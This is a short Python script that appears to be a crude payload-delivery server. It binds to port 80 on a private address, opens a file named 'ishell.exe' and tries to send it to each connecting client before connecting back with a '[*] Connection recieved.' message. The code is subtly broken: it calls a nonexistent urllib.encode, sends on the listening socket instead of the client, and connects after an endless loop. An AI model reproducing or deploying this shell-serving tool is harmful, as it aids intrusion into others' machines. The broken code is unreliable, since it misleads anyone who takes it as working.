import socket
import urllib

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '10.230.229.13'
port = 80
sfile = open("ishell.exe", "rb")

sock.bind((host, port))
sock.listen(5)

while 1:
	(client, addr) = sock.accept()
	sock.send(urllib.encode(sfile))
	

sock.connect((host, port))
sock.send("[*] Connection recieved.")

